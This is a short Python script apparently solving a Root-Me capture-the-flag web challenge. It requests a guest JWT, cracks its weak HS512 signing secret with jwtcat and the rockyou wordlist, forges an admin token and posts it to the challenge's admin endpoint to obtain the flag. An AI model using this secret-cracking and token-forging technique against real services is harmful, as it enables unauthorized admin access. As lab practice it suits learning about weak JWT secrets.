import requests


r=requests.get('http://challenge01.root-me.org/web-serveur/ch59/hello')
print(r.text) # {"message": "Let's play a small game, I bet you cannot access to my super secret admin section. 
              # Make a GET request to /token and use the token you'll get to try to access /admin with a POST request."}
r=requests.get('http://challenge01.root-me.org/web-serveur/ch59/token')
print(r.text)  # {"Here is your token": 
 # "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.a4Cxf97xhqpexX-Mw0Ik74ncg6TdCK8R_Q7wYC929himTEOyJmePFYCJYvj-ICUTZrVqjPUa83GeMO5AVuOH0Q"}

# eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9 => {"alg":"HS512","typ":"JWT"}
# eyJyb2xlIjoiZ3Vlc3QifQ =>  {"role":"guest"}
# a4Cxf97xhqpexX-Mw0Ik74ncg6TdCK8R_Q7wYC929himTEOyJmePFYCJYvj-ICUTZrVqjPUa83GeMO5AVuOH0Q => let's crack it : 
     # python jwtcat.py -t token -v -w rockyou.txt  ==>> Secret key: lol

# we check the website: https://jwt.io/ and change the {"role":"admin"}  and use the key lol
r=requests.post('http://challenge01.root-me.org/web-serveur/ch59/admin')
print(r.text) # {"message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"}

header={'Authorization': 'Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.ShHwc6DRicQBw6YD0bX1C_67QKDQsOY5jV4LbopVghG9cXID7Ij16Rm2DxDZoCy3A7YXQpU4npOJNM-lt0gvmg'}
r=requests.post('http://challenge01.root-me.org/web-serveur/ch59/admin',headers=header)
print(r.text)

# {"result": "Congrats!! Here is your flag: PleaseUseAStrongSecretNextTime"}

